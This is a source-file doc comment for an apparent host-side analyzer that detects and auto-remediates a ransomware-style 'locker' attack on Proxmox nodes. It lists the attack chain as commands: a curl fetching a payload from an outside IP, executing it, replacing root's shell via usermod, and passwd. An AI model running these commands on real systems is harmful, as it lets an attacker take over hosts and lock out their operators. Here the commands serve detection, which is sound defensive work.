//! Compromise-indicator analyzer.
//!
//! Scans this node for the host-side fingerprints of the
//! "BootingWorld" ransomware-style attack that hit klasSponsor's
//! Proxmox cluster on 2026-05-14. The attack chain was:
//!
//!   1. SSH brute-force or exposed credentials → root login.
//!   2. `curl -k http://83.168.95.185:8080/locker -o /usr/local/sbin/locker`
//!      → drops the payload binary.
//!   3. `chmod 700 /usr/local/sbin/locker && /usr/local/sbin/locker lock`
//!      → masks `pveproxy`, `pvedaemon`, `pve-cluster`, `corosync` to
//!      block the operator from fixing the GUI, and prints a "SYSTEM
//!      LOCKED" banner from the modified shell.
//!   4. `usermod -s /usr/local/sbin/locker root` (or hand-edited
//!      `/etc/passwd`) → every interactive shell run as root spawns
//!      the ransom banner instead of bash.
//!   5. `passwd` → locks the operator out of password login.
//!
//! Notably the attack did NOT touch ZFS, did NOT encrypt VM disks,
//! and did NOT modify `/etc/pve/qemu-server/*.conf`. The whole thing
//! is a host-OS layer compromise designed to extort via panic before
//! the operator looks at the data layer. Every indicator below is
//! cheap to read and deterministic — no heuristics, no scoring, just
//! "did this exact bad thing happen".
//!
//! ## Why we run this on every node, not just compromised ones
//!
//! The analyzer fires on whatever WolfStack is installed on. Klas had
//! WolfStack natives and Proxmox hosts running WolfStack side-by-side
//! — the natives were untouched, the Proxmox hosts were the target.
//! We don't know in advance which class a given install is, so we
//! check the cheap host-fact set on every tick.
//!
//! ## Design rules followed
//!
//! * **Detect AND fix.** Every high-confidence indicator triggers
//!   immediate auto-remediation in the same sampling pass — manual
//!   response is too slow when an attacker has root. The proposal
//!   then documents *both* the original detection and what the
//!   analyzer did about it, so the operator sees the full audit
//!   trail in the inbox card. Indicators whose remediation would
//!   destroy forensic evidence (`.bash_history`) are detection-only.
//! * **Capture before delete.** When we remove the dropped payload
//!   `/usr/local/sbin/locker`, we first copy it to
//!   `/var/lib/wolfstack/forensics/locker-<ts>-<sha8>.captured`
//!   along with a SHA-256 in `iocs.txt`. The operator's incident-
//!   response capture is preserved even though the live binary is
//!   gone.
//! * **Idempotent.** Every action checks state before mutating — a
//!   second tick over an already-cleaned host is a no-op (no
//!   spurious "fixed!" log lines, no double-DROP iptables rules).
//! * **One Critical finding per indicator class**, scoped to this
//!   node — so an operator can ack "yes the root shell hijack is
//!   mine" without hiding the parallel "/usr/local/sbin/locker
//!   exists" finding. Each remediation outcome is in the finding's
//!   evidence so an operator confirming a card sees what was done.
//! * **Hard timeout via tokio's `spawn_blocking`** wrapper at the
//!   orchestrator layer — every individual check + fix inside this
//!   module has a small bounded budget (a few file ops + a couple
//!   of `systemctl`/`iptables` subprocess calls, no large forks).
